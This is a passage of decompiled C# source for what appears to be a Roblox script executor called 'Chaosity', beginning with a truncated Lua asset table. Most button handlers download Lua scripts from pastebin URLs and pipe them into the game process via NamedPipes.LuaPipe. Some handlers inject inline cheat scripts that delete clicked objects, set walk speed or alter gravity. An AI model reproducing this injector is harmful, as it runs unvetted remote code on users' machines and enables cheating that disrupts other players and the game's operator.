=\n{\n['assets'] =\n{\n[1] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 616980142,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[2] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 602599987,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[3] =\n{\n['drotation'] =\n{\n['y'] = 180,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 100,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 244159819,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[4] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 7075502,\n['changedFX'] = false,\n['position'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['fx'] =\n{\n[1] = true,\n[2] = true,\n[3] = true,\n[4] = true,\n[5] = true\n},\n['vrotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['vposition'] =\n{\n['y'] = 0,\n['x'] = -0,\n['z'] = -0\n}\n},\n[5] =\n{\n['drotation'] =\n{\n['y'] = 90,\n['x'] = 90,\n['z'] = 90\n},\n['dposition'] =\n{\n['y'] = 200,\n['x'] = 200,\n['z'] = 200\n},\n['scale'] =\n{\n['y'] = 100,\n['x'] = 100,\n['z'] = 100\n},\n['dscale'] =\n{\n['y'] = 500,\n['x'] = 500,\n['z'] = 500\n},\n['vscale'] =\n{\n['y'] = 1,\n['x'] = 1,\n['z'] = 1\n},\n['rotation'] =\n{\n['y'] = 0,\n['x'] = 0,\n['z'] = 0\n},\n['assetId'] = 916733101,\n['changed[...string is too long...]");
    }

    private void flatButton293_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("https://pastebin.com/0Z03JjuL");
    }

    private void flatButton293_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/c7JbgHA1"));
      Thread.Sleep(100);
    }

    private void richTextBox6_TextChanged(object sender, EventArgs e)
    {
    }

    private void flatButton294_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/fSi99b4q"));
      Thread.Sleep(100);
    }

    private void flatButton295_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jbBnmJ1k"));
      Thread.Sleep(100);
    }

    private void flatButton296_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/er44Xpdt"));
      Thread.Sleep(100);
    }

    private void flatButton297_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/PLKTh6i5"));
      Thread.Sleep(100);
    }

    private void flatButton299_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/KAdNHYXQ"));
      Thread.Sleep(100);
    }

    private void flatButton298_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/6aXS152A"));
      Thread.Sleep(100);
    }

    private void flatButton301_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nV8nBGiJ"));
      Thread.Sleep(100);
    }

    private void flatButton300_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/RQuUyH7j"));
      Thread.Sleep(100);
    }

    private void flatButton302_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wqz2rB36"));
      Thread.Sleep(100);
    }

    private void flatButton303_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/gEfb23JG"));
      Thread.Sleep(100);
    }

    private void flatButton304_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/uyzGZ9Bc"));
      Thread.Sleep(100);
    }

    private void flatButton305_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/NVXt1cqF"));
      Thread.Sleep(100);
    }

    private void flatButton306_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nZkmBVnF"));
      Thread.Sleep(100);
    }

    private void flatButton307_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kGsb95uJ"));
      Thread.Sleep(100);
    }

    private void flatButton308_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/NGQy7xaZ"));
      Thread.Sleep(100);
    }

    private void flatButton309_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/J3UxdJnV"));
      Thread.Sleep(100);
    }

    private void flatButton310_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/f2cGvt1w"));
      Thread.Sleep(100);
    }

    private void flatButton311_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/k2SKDkd1"));
      Thread.Sleep(100);
    }

    private void flatButton313_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/RLig9bhT"));
      Thread.Sleep(100);
    }

    private void flatButton312_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jU6zm5K6"));
      Thread.Sleep(100);
    }

    private void flatButton262_Click_1(object sender, EventArgs e)
    {
    }

    private void flatButton263_Click_2(object sender, EventArgs e)
    {
      this.formSkin1.FlatColor = System.Drawing.Color.Aqua;
      this.formSkin1.Refresh();
    }

    private void flatButton314_Click(object sender, EventArgs e)
    {
      this.formSkin1.FlatColor = System.Drawing.Color.DarkBlue;
      this.formSkin1.Refresh();
    }

    private void flatButton262_Click_2(object sender, EventArgs e)
    {
      Process.Start("https://Chaosity.wikia.com/wiki/Chaosity_Wiki");
    }

    private void flatButton263_Click_3(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/gVXHPmD9"));
      Thread.Sleep(100);
    }

    private void flatButton314_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/iuPBEHL2"));
      Thread.Sleep(100);
    }

    private void flatButton316_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/GWziaAHF"));
      Thread.Sleep(100);
    }

    private void flatButton315_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/zdiv6jiJ"));
      Thread.Sleep(100);
    }

    private void flatButton317_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/9E9eBFwp"));
      Thread.Sleep(100);
    }

    private void flatButton318_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/p8iThZnY"));
      Thread.Sleep(100);
    }

    private void flatButton319_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/4Ur09Jhr"));
      Thread.Sleep(100);
    }

    private void flatButton320_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/VKGHcR8Y"));
      Thread.Sleep(100);
    }

    private void flatButton324_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Ep4eDiZw"));
      Thread.Sleep(100);
    }

    private void flatButton323_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/pQGPQvmm"));
      Thread.Sleep(100);
    }

    private void flatButton322_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/0J2WSrEq"));
      Thread.Sleep(100);
    }

    private void flatButton321_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/2As5v0ZN"));
      Thread.Sleep(100);
    }

    private void flatButton325_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/dMk1040P"));
      Thread.Sleep(100);
    }

    private void flatButton326_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/B9086zdv"));
      Thread.Sleep(100);
    }

    private void flatButton328_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/fFSyv7xs"));
      Thread.Sleep(100);
    }

    private void flatButton327_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/M0kLx7ej"));
      Thread.Sleep(100);
    }

    private void flatButton329_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/1DVZs20E"));
      Thread.Sleep(100);
    }

    private void flatButton330_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/fhcj6ERz"));
      Thread.Sleep(100);
    }

    private void flatButton332_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/fkgmTiBZ"));
      Thread.Sleep(100);
    }

    private void flatButton331_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/PYKKkFni"));
      Thread.Sleep(100);
    }

    private void flatButton333_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/T4phG73Q"));
      Thread.Sleep(100);
    }

    private void flatButton334_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/8hXGf11T"));
      Thread.Sleep(100);
    }

    private void flatButton336_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/M8ubK6nn"));
      Thread.Sleep(100);
    }

    private void flatButton335_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/X9xTGF9F"));
      Thread.Sleep(100);
    }

    private void flatButton337_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mc1MRJV5"));
      Thread.Sleep(100);
    }

    private void flatButton338_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Xs709Hrf"));
      Thread.Sleep(100);
    }

    private void flatButton339_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/C0Nux7iR"));
      Thread.Sleep(100);
    }

    private void flatButton340_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/4U25PRd0"));
      Thread.Sleep(100);
    }

    private void flatButton341_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/2HCRLnGL"));
      Thread.Sleep(100);
    }

    private void flatButton342_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/xxBCmdwH"));
      Thread.Sleep(100);
    }

    private void flatButton343_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ebmzNkYE"));
      Thread.Sleep(100);
    }

    private void flatButton344_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mnZ5Y9xX"));
      Thread.Sleep(100);
    }

    private void flatButton345_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
      this.flatButton42.Text = "Alt Delete: On";
      this.isClickDeleteEnabled = true;
    }

    private void flatButton346_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/NaUACHmk"));
      Thread.Sleep(100);
    }

    private void flatButton347_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/vHfHGnRi"));
      Thread.Sleep(100);
    }

    private void flatButton348_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ju5m9w0w"));
      Thread.Sleep(100);
    }

    private void flatButton349_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nvZ6ThRi"));
      Thread.Sleep(100);
    }

    private void flatMini1_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void tabPage33_Click(object sender, EventArgs e)
    {
    }

    private void flatButton350_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/syQ56kJp"));
      Thread.Sleep(100);
    }

    private void flatButton351_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/c4sZAKDQ"));
      Thread.Sleep(100);
    }

    private void flatButton352_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/8KH8R0nu"));
      Thread.Sleep(100);
    }

    private void flatButton353_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("workspace.Gravity = 1");
    }

    private void flatButton354_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("workspace.Gravity = 122");
    }

    private void flatButton357_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/cpx2XxPt"));
      Thread.Sleep(100);
    }

    private void flatButton356_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eWxjzjnM"));
      Thread.Sleep(100);
    }

    private void flatButton355_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/TgUs2EvW"));
      Thread.Sleep(100);
    }

    private void flatButton358_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/5mUPh6fD"));
      Thread.Sleep(100);
    }

    private void flatButton359_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/xEmJuNfP"));
      Thread.Sleep(100);
    }

    private void flatButton360_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/6vrbLemf"));
      Thread.Sleep(100);
    }

    private void flatButton362_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ES6xMCn7"));
      Thread.Sleep(100);
    }

    private void flatButton361_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/9UtBscMx"));
      Thread.Sleep(100);
    }

    private void flatButton366_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/L7pH1Hud"));
      Thread.Sleep(100);
    }

    private void flatButton365_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/BdiDydyf"));
      Thread.Sleep(100);
    }

    private void flatButton364_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jXRsrYmZ"));
      Thread.Sleep(100);
    }

    private void flatButton363_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZazrZE2S"));
      Thread.Sleep(100);
    }

    private void flatButton370_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ng0wpmNC"));
      Thread.Sleep(100);
    }

    private void flatButton369_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/cNCEhntk"));
      Thread.Sleep(100);
    }

    private void flatButton368_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/LBWDnMU8"));
      Thread.Sleep(100);
    }

    private void flatButton367_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jVrdyNfG"));
      Thread.Sleep(100);
    }

    private void flatButton374_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/bNn6pyw5"));
      Thread.Sleep(100);
    }

    private void flatButton373_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kXY6CyKB"));
      Thread.Sleep(100);
    }

    private void flatButton372_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rWGYscZG"));
      Thread.Sleep(100);
    }

    private void flatButton371_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/7T0LkN3f"));
      Thread.Sleep(100);
    }

    private void flatButton376_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/J6vpg9P7"));
      Thread.Sleep(100);
    }

    private void flatButton375_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/2E2tyXRf"));
      Thread.Sleep(100);
    }

    private void flatButton378_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Password = ShTeam", "Chaosity", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JaNgMFw3"));
      Thread.Sleep(100);
    }

    private void flatButton377_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/D3aGXiHZ"));
      Thread.Sleep(100);
    }

    private void flatButton380_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/65TPHJfe"));
      Thread.Sleep(100);
    }

    private void flatButton379_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/L2EPNwpV"));
      Thread.Sleep(100);
    }

    private void flatButton384_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JDDRZtBL"));
      Thread.Sleep(100);
    }

    private void flatButton383_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/FsNCrzUW"));
      Thread.Sleep(100);
    }

    private void flatButton382_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mduJpQ1h"));
      Thread.Sleep(100);
    }

    private void flatButton381_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Djg7HWYe"));
      Thread.Sleep(100);
    }

    private void flatButton388_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rsDTndQh"));
      Thread.Sleep(100);
    }

    private void flatButton387_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kzLeJatH"));
      Thread.Sleep(100);
    }

    private void flatButton386_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/qC33r0bm"));
      Thread.Sleep(100);
    }

    private void flatButton385_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/MEzRqeE5"));
      Thread.Sleep(100);
    }

    private void flatButton390_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/RHRqmajZ"));
      Thread.Sleep(100);
    }

    private void flatButton389_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZH7AEwQL"));
      Thread.Sleep(100);
    }

    private void flatButton391_Click(object sender, EventArgs e)
    {
      if (this.isClickDeleteEnabled)
      {
        if (this.flatButton42.Text != "Alt Delete: On")
        {
          NamedPipes.LuaPipe("_G.iEnabledOrNot = true;");
          this.flatButton42.Text = "Alt Delete: On";
          this.isClickDeleteEnabled = true;
        }
        else
        {
          NamedPipes.LuaPipe("_G.iEnabledOrNot = false;");
          this.flatButton42.Text = "Alt Delete: Off";
          this.isClickDeleteEnabled = false;
        }
      }
      else
      {
        NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
        this.flatButton42.Text = "Alt Delete: On";
        this.isClickDeleteEnabled = true;
      }
    }

    private void flatButton392_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/u7SBWWuG"));
      Thread.Sleep(100);
    }

    private void flatButton394_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/VQHZPXKC"));
      Thread.Sleep(100);
    }

    private void flatButton396_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 100 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton393_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/GWchDv9n"));
      Thread.Sleep(100);
    }

    private void flatButton395_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/7TtEh7hJ"));
      Thread.Sleep(100);
    }

    private void flatButton400_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/s5imjUgk"));
      Thread.Sleep(100);
    }

    private void flatButton399_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/PycHKU3K"));
      Thread.Sleep(100);
    }

    private void flatButton397_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/z0KDEKCW"));
      Thread.Sleep(100);
    }

    private void flatButton398_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/sxzYugsf"));
      Thread.Sleep(100);
    }

    private void flatButton404_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/7aLrft3t"));
      Thread.Sleep(100);
    }

    private void flatButton403_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/zYxW4w1x"));
      Thread.Sleep(100);
    }

    private void flatButton401_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ph8tpykx"));
      Thread.Sleep(100);
    }

    private void flatButton402_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/QQqpcSSi"));
      Thread.Sleep(100);
    }

    private void flatButton408_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/qpTCLh8G"));
      Thread.Sleep(100);
    }

    private void flatButton407_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/V5z17UGu"));
      Thread.Sleep(100);
    }

    private void flatButton405_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Fw8MV6sY"));
      Thread.Sleep(100);
    }

    private void flatButton406_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/W1Nwht1L"));
      Thread.Sleep(100);
    }

    private void flatButton412_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/FN5qVfJc"));
      Thread.Sleep(100);
    }

    private void flatButton411_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/s63iqcEm"));
      Thread.Sleep(100);
    }

    private void flatButton409_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/aWij2ac3"));
      Thread.Sleep(100);
    }

    private void flatButton410_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eUYG612X"));
      Thread.Sleep(100);
    }

    private void flatButton416_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/SGAE6395"));
      Thread.Sleep(100);
    }

    private void flatButton415_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/2RUQwHdW"));
      Thread.Sleep(100);
    }

    private void flatButton413_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/MDXTb9LM"));
      Thread.Sleep(100);
    }

    private void flatButton414_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/xviAFyH8"));
      Thread.Sleep(100);
    }

    private void flatButton419_Click(object sender, EventArgs e)
    {
